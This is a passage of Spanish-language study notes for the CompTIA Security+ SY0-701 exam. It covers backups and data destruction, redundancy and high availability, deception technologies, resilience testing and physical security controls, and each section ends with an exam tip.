- Volver a estados anteriores
- Recuperarse de cierres inesperados (identificar y deshacer transacciones incompletas)

Ejemplos: `JFS` (Journaled File System), `NTFS` con journaling habilitado.

#### Cifrado de copias de seguridad

Razones fundamentales:
- **Seguridad:** datos ilegibles sin la clave de descifrado correcta
- **Privacidad:** protege datos confidenciales de clientes, propiedad intelectual
- **Cumplimiento normativo:** muchas regulaciones exigen protección de backups

> ⚠️ Los conjuntos de backup suelen pasarse por alto como vectores de ataque, pero contienen datos igual de sensibles que los sistemas primarios.

> **👉 Enfoque de Examen SY0-701:**
> Distingue **snapshot** (punto en el tiempo, reversible) de **replicación** (copia continua/en tiempo real). La replicación sincrónica garantiza consistencia; la asincrónica es más económica. Para Hyper-V, recuerda que "checkpoint" = snapshot. El examen puede preguntar qué técnica usarías si necesitas recuperarte de transacciones incompletas → **Journaling**.

### 7.1.5 Destrucción segura de datos

> **Analogía:** Borrar un archivo no es como quemar un papel; es como arrancar la etiqueta de un cajón sin vaciar el cajón. Los datos siguen ahí hasta que algo nuevo los sobreescriba.

#### Cuándo se requiere destrucción de datos

- Final del período de retención de datos
- Cumplimiento con **RGPD** (Reglamento General de Protección de Datos) o **HIPAA** (Health Insurance Portability and Accountability Act)
- Retiro de servicio de dispositivos
- Datos obsoletos que ocupan almacenamiento

#### Métodos por tipo de medio

| Medio | Métodos efectivos |
|---|---|
| **HDD** (Hard Disk Drive) | Sobrescritura con ceros, patrones múltiples; relleno cero |
| **SSD** (Solid State Drive) | `ATA Secure Erase` (a nivel firmware); sobrescritura estándar NO es efectiva por nivelado de desgaste |

> ⚠️ En HDD, los archivos eliminados NO se borran completamente: los sectores se marcan como disponibles pero los datos persisten hasta ser sobrescritos.

#### Métodos de sobrescritura para HDD

- **Relleno cero (1 pasada):** establece todos los bits a 0. Puede dejar patrones detectables.
- **Método de 3 pasadas:** pasada de ceros → pasada de unos → pasada pseudoaleatoria. Más seguro.
- **Agencias federales:** pueden requerir más de 3 pasadas.

#### Enajenación de activos — conceptos clave

| Concepto | Descripción |
|---|---|
| **Sanitización** | Eliminar información confidencial del medio (borrado, desmagnetización, cifrado) para posible reutilización/donación |
| **Destrucción** | Eliminación física (trituración, aplastamiento, incineración) o electrónica (sobrescritura múltiple, desmagnetización) — datos irrecuperables |
| **Certificación** | Documentación y verificación del proceso; certificado de destrucción de proveedor acreditado (tercero imparcial) |

> 💡 Herramienta de referencia en el examen: **Active KillDisk** — software de borrado que implementa "One Pass Zeros" y métodos más avanzados.

> **👉 Enfoque de Examen SY0-701:**
> Pregunta trampa clásica: ¿qué método usar para sanitizar un SSD? La respuesta es **ATA Secure Erase**, NO la sobrescritura con múltiples pasadas (ineficaz por el wear leveling). Para HDD, la sobrescritura multipasada ES válida. También distingue **sanitización** (puede reutilizarse) de **destrucción** (irrecuperable). La **certificación** requiere tercero — no puedes certificarte a ti mismo de forma imparcial.

## 7.2 Estrategias de redundancia

La redundancia es el principio de "nunca un punto único de fallo". Como tener neumático de repuesto en el coche: no lo usas normalmente, pero cuando lo necesitas, es crítico.

Estrategias clave:
- **COOP** (Continuity of Operations Planning — Planificación de Continuidad de Operaciones)
- Clústeres de **HA** (High Availability — Alta Disponibilidad)
- Redundancia de energía
- Diversidad de proveedores y defensa en profundidad
- Pruebas periódicas (tabletop, failover, simulaciones)

### 7.2.1 Continuidad de las operaciones

#### COOP (Continuity of Operations Planning)

> **Analogía:** COOP es el plan de evacuación de un edificio: existe antes del incendio, define quién hace qué, y se practica regularmente para que funcione cuando sea necesario.

Elementos clave de un plan COOP:
- Identificar funciones comerciales críticas
- Establecer prioridades y recursos necesarios
- Crear redundancia para sistemas y datos de TI
- Definir modalidades alternativas de trabajo (remoto, coubicación)
- Protocolos claros de comunicación y toma de decisiones
- **Pruebas y actualizaciones periódicas**

#### COOP vs. Continuidad del negocio (BC)

| Aspecto | COOP | BC (Business Continuity) |
|---|---|---|
| **Alcance** | Funciones críticas de TI/operaciones | Toda la organización |
| **Marco temporal** | Respuesta inmediata | Largo plazo |
| **Enfoque** | Restaurar funciones críticas rápidamente | Resiliencia y viabilidad organizacional total |
| **Incluye** | Backups, failover, DR | Cadena de suministro, comunicación, cumplimiento legal, reputación |

> COOP es un **componente** de BC. BC es el concepto más amplio.

#### Planificación de la capacidad

Proceso de evaluar necesidades actuales y futuras de recursos.

| Dimensión | Consideraciones |
|---|---|
| **Personas** | Cantidad, habilidades, brechas, capacitación |
| **Tecnología** | HW, SW, red; rendimiento, escalabilidad, confiabilidad |
| **Infraestructura** | Instalaciones físicas, energía, refrigeración, conectividad |

Métodos de planificación:
- **Análisis de tendencias:** examina datos históricos para identificar patrones
- **Modelado de simulación:** modelos computacionales para simular escenarios reales
- **Evaluación comparativa (Benchmarking):** compara métricas con estándares/mejores prácticas del sector

> **👉 Enfoque de Examen SY0-701:**
> La distinción COOP vs. BC aparece frecuentemente. Recuerda: COOP = respuesta inmediata y restauración de funciones críticas; BC = enfoque integral y largo plazo. El examen puede presentar un escenario y preguntar qué tipo de plan aplica. Distractor: confundir COOP con DR (Disaster Recovery) — DR es la recuperación técnica; COOP incluye también los procesos organizacionales.

### 7.2.2 Riesgos de la planificación de la capacidad

#### Riesgos para las personas

| Riesgo | Descripción |
|---|---|
| Personal insuficiente / brechas de habilidades | Recursos mal asignados o subutilizados |
| Dependencia en personas específicas | Vulnerabilidad si esa persona no está disponible |
| Resistencia al cambio | Obstaculiza operaciones de seguridad |

**Estrategias de mitigación:**

- **Capacitación combinada (Cross-training):** empleados desarrollan habilidades fuera de su rol principal → múltiples personas pueden realizar tareas críticas → flexibilidad y resiliencia.
- **Planes de trabajo remoto:** definen canales de comunicación, requisitos tecnológicos y expectativas para trabajo a distancia.
- **Estructuras alternativas de reporting:** relaciones de reporte de respaldo para evitar puntos únicos de fallo en la gestión.

#### Tecnologías para trabajo remoto

| Tecnología | Función |
|---|---|
| **VPN** (Virtual Private Network) | Acceso seguro a red interna |
| Software de escritorio remoto | Acceso remoto a equipos de oficina |
| Herramientas cloud | Microsoft 365, Google Workspace, Dropbox, Slack |
| Videoconferencia | Zoom, Microsoft Teams, Webex |
| Mensajería instantánea | Slack, Teams, Discord |
| Sistemas telefónicos virtuales | Llamadas desde PC/móvil vía cloud |
| Gestión de proyectos | Trello, Asana, Jira |

#### Riesgos de despidos (impacto en seguridad)

**Riesgos de ciberseguridad:**
- Empleados descontentos → acceso no autorizado o uso indebido de datos
- Pérdida de conocimiento experto → brechas de seguridad y errores de configuración
- Revocación inadecuada de accesos → vulnerabilidades persistentes

**Riesgos físicos:**
- Robo o sabotaje de activos físicos
- Acceso no autorizado si las credenciales no se revocan inmediatamente

**Mitigación:** procedimientos de desvinculación robustos, transferencia de conocimiento, revocación inmediata de accesos.

#### Riesgos de planificación deficiente vs. sobreestimación

| Escenario | Consecuencias |
|---|---|
| **Subestimación de capacidad** | Sistemas sobrecargados, más vulnerables a DoS (Denial of Service), descuido de medidas de seguridad, inversión insuficiente en controles físicos |
| **Sobreestimación de capacidad** | Gastos innecesarios, ROI negativo, mayor consumo energético, mayor complejidad de gestión, costo de oportunidad |

> **👉 Enfoque de Examen SY0-701:**
> El examen pregunta sobre qué riesgos de seguridad introduce la mala planificación de capacidad. Los sistemas sobrecargados son más vulnerables a ataques **DoS**. También puede preguntar sobre qué hacer cuando un empleado es despedido — la respuesta correcta siempre incluye **revocación inmediata** de accesos físicos y lógicos.

### 7.2.3 Alta disponibilidad

#### Definición y métricas

**HA (High Availability — Alta Disponibilidad):** diseño de sistemas que permanecen operativos con tiempo de inactividad mínimo.

**MTD (Maximum Tolerable Downtime — Tiempo de Inactividad Máximo Tolerable):** métrica que expresa el requisito de disponibilidad para una función empresarial.

#### Tabla de "los nueves"

| Nueves | Disponibilidad | Tiempo inactividad anual |
|---|---|---|
| Seis | 99,9999 % | 00:00:32 h |
| Cinco | 99,999 % | 00:05:15 h |
| Cuatro | 99,99 % | 00:52:34 h |
| Tres | 99,9 % | 08:45:36 h |
| Dos | 99 % | 87:36:00 h |

> Los sistemas críticos se describen típicamente como 24×7 o 24×365.

#### Escalabilidad y elasticidad

| Concepto | Definición |
|---|---|
| **Escalabilidad** | Capacidad de aumentar recursos para satisfacer demanda manteniendo ratios de costo similares |
| **Escalado horizontal** | Agregar más recursos en paralelo (más servidores) |
| **Escalado vertical** | Aumentar la potencia de los recursos existentes (más RAM/CPU) |
| **Elasticidad** | Capacidad de abordar cambios de demanda **en tiempo real** — sin pérdida de servicio ante aumentos repentinos |

#### Tolerancia a fallas y redundancia

- **Sistema tolerante a fallas:** puede experimentar fallos y continuar operando al mismo nivel de servicio.
- Se logra mediante **redundancia** de componentes críticos (puntos únicos de fallo).
- Un **componente redundante** no es necesario en operación normal, pero permite recuperación ante fallo de otro componente.

#### Consideraciones del sitio (Site Resilience)

| Tipo de sitio | Descripción | Tiempo de activación |
|---|---|---|
| **Hot site** (sitio caliente) | Equipos operativos actualizados con datos en tiempo real, propiedad de la empresa | Casi inmediato |
| **Warm site** (sitio cálido) | Infraestructura lista pero requiere cargar el dataset más reciente antes de usar | Horas |
| **Cold site** (sitio frío) | Edificio vacío con contrato de arrendamiento; instalar equipos cuando se necesite | Días |

**Failover (Conmutación por error):** técnica que garantiza que un componente/dispositivo/sitio redundante asuma la funcionalidad del activo fallido de forma rápida.

**Dispersión geográfica:** distribuir sitios de recuperación en distintas ubicaciones para minimizar el impacto de desastres regionales.

#### La nube como DR (Disaster Recovery)

Ventajas de usar cloud para redundancia de sitios:
- **Eficiencia en costos** (economías de escala)
- **Escalabilidad** sin aprovisionar en exceso
- **Diversidad geográfica** integrada
- **Implementación más rápida** que construir infraestructura propia
- **Gestión simplificada**
- **Mejoras en seguridad y cumplimiento normativo**

#### Prueba de redundancia y HA

| Tipo de prueba | Descripción |
|---|---|
| **Pruebas de carga** | Validar rendimiento bajo cargas máximas; identificar cuellos de botella |
| **Pruebas de failover** | Provocar fallo intencionado para validar la transición a infraestructura secundaria |
| **Pruebas de sistemas de monitoreo** | Validar detección y respuesta efectivas ante fallas |

> **👉 Enfoque de Examen SY0-701:**
> Memoriza la tabla de "los nueves" — CompTIA pregunta cuánto tiempo de inactividad permite cierto nivel de disponibilidad. Diferencia clave: **hot site** = datos en tiempo real, activación inmediata; **cold site** = más barato, más lento. El distractor clásico es confundir **elasticidad** (tiempo real, automática) con **escalabilidad** (planificada, no necesariamente inmediata).

### 7.2.4 Agrupamiento o clustering

> **Analogía:** Un clúster de servidores es como un equipo de médicos de guardia. Si un médico cae enfermo, otro toma su turno sin que el paciente (el cliente) lo note.

#### Clúster vs. Balanceador de carga

| Concepto | Función |
|---|---|
| **Balanceador de carga** | Distribuye solicitudes entre nodos independientes; gestión de tráfico web |
| **Clúster** | Nodos que **comparten datos** entre sí; proporciona redundancia y HA para BBDD, servidores de archivos, etc. |

Para el cliente, el clúster **parece un único servidor**.

#### IP Virtual (VIP — Virtual IP Address)

Cuando dos dispositivos (ej. dos balanceadores de carga) comparten una IP pública, esta se llama **dirección IP virtual, compartida o flotante**.

- Los nodos se identifican internamente por su IP "real"
- Protocolo de redundancia: **CARP** (Common Address Redundancy Protocol)
- Mecanismo de **heartbeat (latido):** detecta si el nodo activo falla para activar failover al nodo pasivo

#### Clustering Activo/Pasivo (A/P) vs. Activo/Activo (A/A)

| Modo | Descripción | Ventaja | Desventaja |
|---|---|---|---|
| **A/P (Activo/Pasivo)** | Un nodo activo, otro en espera | Rendimiento no afectado durante failover | Mayor costo (capacidad no utilizada) |
| **A/A (Activo/Activo)** | Ambos nodos procesan simultáneamente | Utiliza capacidad máxima | En failover, el nodo restante carga más → degradación del rendimiento |

#### Configuraciones N+1 y N+M

| Config | Descripción |
|---|---|
| **N+1** | 1 nodo pasivo compartido entre N nodos activos (ej. 5 activos + 1 pasivo) |
| **N+M** | M nodos pasivos compartidos entre N nodos activos (ej. 10 activos + 2-3 pasivos) |

Objetivo: reducir costos de hardware sin sacrificar toda la redundancia.

#### Agrupamiento de aplicaciones

Permite que los servidores del clúster compartan **información de sesión** entre sí. Si un usuario inicia sesión en la instancia A y la siguiente petición va a la instancia B, esta puede acceder a las cookies/tokens de sesión — experiencia de usuario continua.

> **👉 Enfoque de Examen SY0-701:**
> Pregunta típica: ¿qué diferencia hay entre A/P y A/A? → En A/P el rendimiento no se degrada en failover pero hay coste ocioso; en A/A hay mejor utilización pero degradación al fallar un nodo. También preguntan sobre la VIP y el protocolo CARP. Distractor: confundir **balanceador de carga** (distribuye tráfico) con **clúster** (comparte datos y proporciona HA).

### 7.2.5 Redundancia de energía

> **Analogía:** La redundancia de energía es como los generadores de un hospital: cuando falla la red eléctrica, los quirófanos no se apagan.

#### Cadena de suministro eléctrico (de mayor a menor urgencia)

```
Red eléctrica → PDU → UPS → Servidor/Rack → PSU dual
                              ↑
                         Generador de backup (cuando UPS se agota)
```

#### Componentes clave

| Componente | Descripción |
|---|---|
| **PSU dual** (Power Supply Unit) | Dos fuentes de alimentación por servidor; hot-swappable (reemplazable sin apagar) |
| **PDU** (Power Distribution Unit) | Unidad de distribución de energía; limpia señal, protege contra picos/sobretensiones, integra con UPS; las gestionadas permiten monitoreo remoto |
| **UPS** (Uninterruptible Power Supply) | Alimentación ininterrumpida; proporciona energía temporal (minutos a horas) para transición a generador o apagado controlado |
| **Generador** | Suministra energía a todo el edificio (días); usa gasoil, propano o gas natural |

#### Consideraciones sobre generadores

- **Gasoil/propano:** almacenamiento seguro requerido; gasoil tiene vida útil de 18 meses - 2 años
- **Gas natural:** depende de suministro continuo (riesgo en desastres naturales)
- **Energías renovables:** solar, eólica, geotérmica, hidrógeno, hidráulica
- **Baterías a gran escala:** alternativa emergente (Tesla Powerpack)
- Los generadores se conectan mediante **interruptores de transferencia** (manuales o automáticos)

> ⚠️ Un generador **no puede conectarse lo suficientemente rápido** para responder a un corte de energía. Por eso el UPS es imprescindible: cubre el tiempo de transición. El UPS debe estar dimensionado para gestionar los requisitos durante ese proceso de transferencia.

> **👉 Enfoque de Examen SY0-701:**
> Pregunta directa: ¿por qué se necesita UPS si hay generador? → Porque el generador tarda en arrancar; el UPS cubre el intervalo. El examen también pregunta sobre el orden correcto: red → PDU → UPS → equipos, con el generador como respaldo del UPS. La **PSU de conexión en caliente** (hot-swappable) permite reemplazo sin apagar el sistema — concepto importante.

### 7.2.6 Diversidad y defensa en profundidad

#### Diversidad de plataformas

Usar múltiples tecnologías, sistemas operativos y componentes HW/SW en la infraestructura.

**Beneficio:** si un componente es comprometido, el resto permanece seguro. Un atacante necesita dominar múltiples plataformas y técnicas.

#### Defensa en profundidad (Defense in Depth)

> **Analogía:** Como un castillo medieval: foso, murallas, torres, guardia interior, cámara acorazada. Ninguna capa es perfecta, pero juntas hacen el ataque muy costoso.

Implementar **múltiples capas** de protección en distintos niveles:

| Capa | Ejemplos |
|---|---|
| Perimetral | Firewalls, IDS (Intrusion Detection Systems) |
| Red | Segmentación, controles de acceso, monitoreo de tráfico |
| Endpoint | Antivirus, hardening de dispositivos, gestión de parches |
| Autenticación | **MFA** (Multi-Factor Authentication) |
| Humana | Capacitación en conciencia de seguridad |
| Respuesta | Planificación de respuesta a incidentes |
| Física | Controles de acceso físico |

#### Diversidad de proveedores

| Beneficio | Descripción |
|---|---|
| **Ciberseguridad** | Evita punto único de fallo; una vulnerabilidad no compromete toda la infraestructura |
| **Resiliencia empresarial** | Evita vendor lock-in; continuidad si un proveedor falla/quiebra |
| **Innovación** | Perspectivas y tecnologías diversas → infraestructura más ágil |
| **Competencia** | Mejores precios y características |
| **Personalización** | Elegir la mejor solución para cada necesidad específica |
| **Gestión de riesgos** | Distribuye el riesgo entre múltiples proveedores |
| **Cumplimiento** | Algunos sectores lo requieren regulatoriamente |

#### Estrategia multinube (Multi-cloud)

Usar múltiples proveedores de servicios cloud simultáneamente.

**Beneficios:**
- Diversifica el riesgo (fallo de un proveedor no compromete todo)
- Aprovecha funciones de seguridad únicas de cada proveedor
- Independencia de proveedor (evita vendor lock-in)
- Competencia saludable entre proveedores → mejores precios
- Optimización: elegir el mejor servicio para cada carga de trabajo

**Ejemplo práctico:** ecommerce con infraestructura principal en proveedor A, backups y DR en proveedor B, datos sensibles con proveedor C (certificaciones de cumplimiento), CDN con proveedor D, y analytics con proveedor E.

> **👉 Enfoque de Examen SY0-701:**
> Defensa en profundidad es un tema recurrente. Recuerda que **ninguna capa es perfecta por sí sola** — la fortaleza está en la combinación. Pregunta trampa: ¿qué es diversidad de proveedores? No es solo usar productos de distintas marcas — es una estrategia deliberada para **eliminar puntos únicos de fallo** a nivel de proveedor. Distractor: confundir estrategia multinube (múltiples proveedores cloud) con multi-región (mismo proveedor, múltiples regiones).

### 7.2.7 Tecnologías de engaño

> **Analogía:** Las honeypots son como señuelos en una trampa de caza: parecen reales y atractivos, pero su propósito es detectar y estudiar al intruso, no al revés.

#### Herramientas de engaño y disrupción

| Herramienta | Descripción |
|---|---|
| **Honeypot** | Sistema señuelo que imita sistemas/aplicaciones reales; monitorea actividad y recopila TTPs (Tactics, Techniques, Procedures) del atacante |
| **Honeynet** | Red de honeypots interconectados; simula una red completa más realista |
| **Honeyfile** | Archivo falso que aparenta contener información confidencial; detecta intentos de robo de datos |
| **Honeytoken** | Credenciales falsas u otros datos señuelo; distraen al atacante, activan alertas y revelan actividad del intruso |

**Objetivo:** aumentar el costo del ataque, inmovilizar recursos del adversario y recopilar inteligencia.

#### Estrategias de disrupción

Usan técnicas de ofuscación para confundir al atacante:

- **Entradas DNS falsas:** enumerar hosts que no existen → desperdicia tiempo de reconocimiento
- **Servidor web con directorios señuelo:** páginas dinámicas falsas → ralentiza escaneos
- **Port triggering / spoofing con telemetría falsa:** reportar puertos como abiertos cuando no lo están → ralentiza escaneos de puertos
- **DNS sinkhole:** redirigir tráfico sospechoso a una red diferente (ej. honeynet) para análisis

> **👉 Enfoque de Examen SY0-701:**
> Memoriza las diferencias: **honeypot** = un sistema; **honeynet** = red de sistemas; **honeyfile** = archivo; **honeytoken** = credencial/dato. El **DNS sinkhole** es específicamente para **redirigir tráfico** sospechoso — no lo confundas con honeynet (que es la red de recepción). Pregunta típica: ¿qué tecnología usarías para detectar intentos de robo de credenciales? → **Honeytoken**.

### 7.2.8 Prueba de resiliencia

> **Analogía:** Los simulacros de emergencia existen porque "recordar" el procedimiento no es lo mismo que "practicarlo". Las pruebas de resiliencia son esos simulacros para los sistemas de TI.

#### Métodos de prueba

| Método | Descripción | Ejemplo |
|---|---|---|
| **Ejercicios tabletop** | Equipos discuten escenarios hipotéticos; evalúan planes de respuesta y comunicación | Simular ataque de ransomware en sala de reuniones |
| **Pruebas de failover** | Provocar intencionadamente el fallo de un sistema primario para validar la transición automática al secundario | Simular fallo del servidor de BBDD primario |
| **Simulaciones** | Experimentos controlados que replican escenarios reales; evalúan resiliencia en condiciones realistas | Ciberataque dirigido a infraestructura de red |
| **Pruebas de procesamiento en paralelo** | Ejecutar sistemas primario y de respaldo simultáneamente para validar sin interrumpir operaciones | Centro de datos de backup manejando el mismo tráfico que el primario |

#### Consecuencias de NO realizar pruebas

- Sistemas y procedimientos no probados pueden fallar en incidentes reales
- Tiempo de inactividad prolongado → pérdida de datos y daño reputacional
- Mayores costos de recuperación y mitigación
- Sanciones regulatorias por incumplimiento de estándares
- Incapacidad para mantener la continuidad del negocio

#### Documentación en continuidad del negocio

| Documento | Contenido |
|---|---|
| **Planes de prueba** | Objetivos, alcance, métodos, roles y responsabilidades |
| **Guiones de prueba (escenarios)** | Instrucciones paso a paso para ejecutar las pruebas |
| **Resultados de prueba** | Fortalezas, debilidades, lecciones aprendidas |
| **Evaluaciones de terceros** | ISO 22301, PCI DSS (Payment Card Industry Data Security Standard), SOC 2 |

> **👉 Enfoque de Examen SY0-701:**
> Distingue los cuatro tipos de prueba: **tabletop** = solo discusión (sin sistemas reales); **failover** = provoca fallo real; **simulación** = escenario controlado completo; **procesamiento en paralelo** = ambos sistemas activos simultáneamente. La prueba menos disruptiva es el **tabletop**; la más completa es la **simulación**. Estándar clave: **ISO 22301** = gestión de continuidad del negocio.

## 7.3 Seguridad Física

> **Analogía:** De nada sirve el mejor firewall del mundo si alguien puede entrar al CPD, conectar un USB y llevarse el servidor. La seguridad física es la primera y última línea de defensa.

La seguridad física protege personal, hardware, software, redes y datos de daños o pérdidas físicas. Incluye:
- Controles de acceso
- Videovigilancia (**CCTV** — Closed-Circuit Television)
- Controles ambientales
- Sensores de detección de intrusiones

**Principio fundamental:** una brecha física puede dar acceso directo a sistemas y datos, eludiendo todas las medidas de ciberseguridad.

### 7.3.1 Controles de seguridad física

Los controles de acceso físico aplican los mismos principios que la seguridad lógica:

| Principio | Descripción |
|---|---|
| **Autenticación** | Listas de acceso y mecanismos de identificación para personas autorizadas |
| **Autorización** | Barreras que controlan el acceso a través de puntos definidos de entrada/salida |
| **Registro (Logging)** | Registro de cuándo se usan los puntos de acceso; detección de brechas |

#### Implementación por zonas

La seguridad física se implementa mediante **zonas progresivamente más restrictivas**:

```
Zona pública → Zona semiprivada → Zona privada → Zona crítica (CPD)
     ↑                ↑                ↑                ↑
   Menor                                             Mayor
  restricción                                      restricción
```

Cada zona está separada por barreras con uno o más mecanismos de control en los puntos de entrada/salida.

> **👉 Enfoque de Examen SY0-701:**
> La seguridad física NO es solo un complemento de la ciberseguridad — es parte integral de ella. CompTIA pregunta sobre los tres principios (autenticación, autorización, registro) en contexto físico. Recuerda que las **zonas** deben ser progresivamente más restrictivas hacia adentro.

### 7.3.2 Plano del sitio, rejas e iluminación

#### CPTED (Crime Prevention Through Environmental Design)
**Seguridad física a través del diseño ambiental:** usar el entorno construido para mejorar la seguridad y prevenir el delito. Se incorpora en el diseño de espacios para que los elementos de seguridad sean naturales, no evidentes y rentables.

#### Barricadas y puntos de entrada/salida

- Propósito: **canalizar** a las personas a través de puntos definidos, no bloquear absolutamente.
- Cada punto de entrada debe tener un mecanismo de autenticación.
- Mecanismos de vigilancia detectan intentos de penetración por otros medios.
- Usos especiales: **bolardos** y puestos de seguridad para proteger contra ataques con vehículos.

#### Cercado (Fencing)

Un cercado de seguridad debe ser:
- **Transparente:** guardias pueden observar intentos de intrusión
- **Robusto:** difícil de cortar
- **Seguro contra escalado:** alto, con alambre de púas o de cuchillas

> ⚠️ Desventaja: puede dar apariencia intimidante. Los edificios que atienden público pueden preferir métodos más discretos.

#### Iluminación de seguridad

Propósitos:
- **Percepción de seguridad** (especialmente de noche)
- **Disuasión** (dificulta intrusiones)
- **Facilitación de vigilancia** (cámaras y guardias)

Consideraciones de diseño:
- Niveles generales de luz
- Iluminación de superficies específicas (ej. para reconocimiento facial)
- Evitar áreas de sombra y deslumbramiento

#### Bolardos

Postes verticales cortos (acero, concreto) instalados a intervalos en perímetros/entradas.
- Pueden ser **fijos o retráctiles** (algunos controlados remotamente)
- Protegen peatones del tráfico
- Evitan acceso no autorizado de vehículos
- Protegen infraestructuras críticas (edificios gubernamentales, aeropuertos, estadios)

#### Principios para estructuras existentes

- Ubicar zonas seguras (salas de equipos) **lo más profundo posible** dentro del edificio
- Diseño de **zona desmilitarizada física:** áreas públicas alejadas de zonas seguras
- Señalización visible en áreas públicas → disuasión
- Puntos de entrada a zonas seguras: **discretos** (no mostrar mecanismos de seguridad)
- **Camuflaje industrial:** edificios de alto valor que pasan desapercibidos
- Minimizar tráfico entre zonas; flujo "dentro y fuera" no "a través"
- Visibilidad alta en áreas públicas → dificulta uso encubierto de puertos de red
- Pantallas y dispositivos de entrada **alejados de ventanas y pasillos**
- **Vidrio unidireccional** (solo visible desde adentro hacia afuera)

> **👉 Enfoque de Examen SY0-701:**
> CPTED es un concepto que aparece en preguntas sobre diseño de seguridad preventiva. Los **bolardos** son específicamente para proteger contra ataques vehiculares. Recuerda la regla de las zonas: lo más crítico debe estar más protegido y más al interior. La pregunta trampa suele ser: ¿qué elemento protege contra que un vehículo embista un edificio? → **Bolardos** (no cercas, no cámaras).

### 7.3.3 Puertas de entrada y cerraduras

#### Tipos de cerradura

| Tipo | Descripción | Ejemplos |
|---|---|---|
| **Física** | Cerradura convencional con llave | Cerraduras de alta seguridad con mayor resistencia al forzado |
| **Electrónica** | PIN en teclado; también llamada de cifrado, combinación o sin llave. Las inteligentes: tarjeta magnética o lector de proximidad (key fob, smart-card) | Teclados numéricos, lectores de tarjeta |
| **Biométrica** | Integrada con escáner biométrico (huella dactilar, iris, reconocimiento facial) | Escáner de huella + cerradura |

#### Vestíbulo de control de acceso (Mantrap / Airlock)

Dos puertas interbloqueadas que permiten el paso de **una persona a la vez**:

1. Persona autentica en la primera puerta (lector de tarjeta / biométrico)
2. Primera puerta se abre → persona entra al vestíbulo
3. Primera puerta se cierra completamente
4. Segunda puerta se abre solo cuando la primera está cerrada

**Propósito:** prevenir **tailgating** (piggybacking — seguir a alguien autorizado sin autenticarse).

Usos: centros de datos, edificios gubernamentales, instituciones financieras.

#### Cerraduras de cable (Cable Locks)

Se sujetan al chasis del dispositivo mediante una ranura de seguridad (**Kensington slot**). Además de fijar el chasis a un rack o escritorio, impiden abrir el chasis sin retirar primero el cable.

#### Credenciales de acceso

Tarjetas con:
- **Banda magnética**
- Chip **RFID** (Radio Frequency Identification — Identificación por Radiofrecuencia)
- **NFC** (Near Field Communication — Comunicación de Campo Cercano)

El lector verifica la credencial con un sistema de control → si es válida y autorizada → desbloquea el acceso.

#### PACS (Physical Access Control System — Sistema de Control de Acceso Físico)

Sistema integral que combina hardware y software:
- Tarjetas/credenciales de acceso
- Lectores de tarjetas
- Paneles de control de acceso
- Red de control centralizada

Capacidades del PACS:
- **Registro de actividades** (hora, ubicación, identidad de cada evento de acceso)
- Identificación del titular (nombre, puesto, foto)
- Datos para auditorías e investigaciones de seguridad
- Planificación de evacuaciones de emergencia

> **👉 Enfoque de Examen SY0-701:**
> El **mantrap/vestíbulo de control de acceso** es la solución específica para prevenir **tailgating** — memoriza este par. RFID y NFC son las tecnologías de credenciales más preguntadas. El PACS es el sistema que integra todo y proporciona el log de auditoría físico. Distractor: confundir tailgating (físico, seguir a alguien) con piggybacking (que es el mismo concepto con otro nombre).

### 7.3.4 Cámaras y guardias de seguridad

#### Guardias de seguridad

**Ventajas:**
- Verificación de identidad en puntos de control
- Elemento de disuasión visual
- Juicio e intuición humana ante situaciones anómalas
- Respuesta inmediata

**Desventajas:**
- Alto costo
- No pueden estar en zonas donde no tienen la autorización de seguridad adecuada
- Requieren capacitación y evaluación continua

#### Videovigilancia (CCTV)

**Ventajas:**
- Más económica que guardias en cada acceso
- Registro de movimientos y accesos
- Elemento disuasorio eficaz

**Desventajas:**
- Tiempos de respuesta más largos
- Requiere personal para monitorear las imágenes

**Arquitectura técnica:**
- Cámaras conectadas a **multiplexor** (cableado coaxial) → pantallas de monitoreo + grabación
- Sistemas modernos: cámaras IP en red de datos estándar

#### Vigilancia inteligente (IA y Machine Learning)

| Capacidad | Descripción |
|---|---|
| **Reconocimiento de movimiento** | Tecnología de identificación de la marcha; alerta si alguien se mueve en patrón no autorizado |
| **Detección de objetos** | Detecta cambios en el entorno (falta de un servidor, dispositivo desconocido en puerto de red) |
| **Drones/UAV** (Unmanned Aerial Vehicles) | Cámaras aéreas que cubren áreas más amplias que patrullas terrestres |

> **👉 Enfoque de Examen SY0-701:**
> La pregunta típica compara guardias vs. CCTV en términos de costo-efectividad. Los guardias son más caros pero tienen mejor tiempo de respuesta y juicio situacional. CCTV es más económica a escala pero depende de que alguien monitoree. Los **drones/UAV** son un elemento emergente en vigilancia perimetral.

### 7.3.5 Sistemas de alarma y sensores

Las alarmas son controles de **detección y disuasión**: alertan del problema y desincentivan el acceso no autorizado. Suelen integrarse con sistemas de control de acceso, CCTV y sensores de movimiento.

#### Tipos de alarmas

| Tipo | Funcionamiento | Uso típico |
|---|---|---|
| **Circuito** | Suena cuando el circuito se abre o cierra (apertura de puerta/ventana, corte de cerca). Circuito cerrado = más seguro (no se puede anular cortando el circuito) | Perímetro, puertas, ventanas |
| **Detección de movimiento** | Vinculada a detector de movimiento (radio por microondas o **PIR** — Passive Infrared — Infrarrojo Pasivo) | Espacios normalmente vacíos |
| **Detección de ruido** | Activada por micrófono + análisis de IA para reducir falsos positivos | Interior de instalaciones |
| **Proximidad** | Usa RFID para rastrear objetos etiquetados; detecta intentos de retirar equipo | Salas de servidores, almacenes |
| **Coacción** | Activada manualmente por personal amenazado (colgantes inalámbricos, activadores ocultos, código PIN especial) | Personal en áreas públicas |

> 💡 Algunas cerraduras electrónicas pueden programarse con un **código de coacción** diferente al código normal: abre la puerta pero alerta al personal de seguridad.

#### Tipos de sensores

| Sensor | Tecnología | Aplicación típica |
|---|---|---|
| **Infrarrojo** | Detecta cambios en patrones de calor causados por movimiento | Sistemas de seguridad residenciales y comerciales; activa alarmas o luces |
| **Presión** | Instalado en pisos/alfombras; activado por peso | Áreas de alta seguridad; conteo de tráfico en retail |
| **Microondas** | Emite pulsos y mide reflexión de objetos en movimiento; combinado con PIR en sensores de **doble tecnología** → reduce falsos positivos | Grandes áreas al aire libre (estacionamientos, áreas valladas) |
| **Ultrasónico** | Emite ondas de sonido por encima del rango humano y mide el tiempo de retorno | Sistemas de iluminación automatizada (enciende/apaga luces según ocupación) |

> 💡 Los sensores de **doble tecnología** (infrarrojo + microondas) requieren que AMBOS se activen simultáneamente → menor tasa de falsas alarmas.

> **👉 Enfoque de Examen SY0-701:**
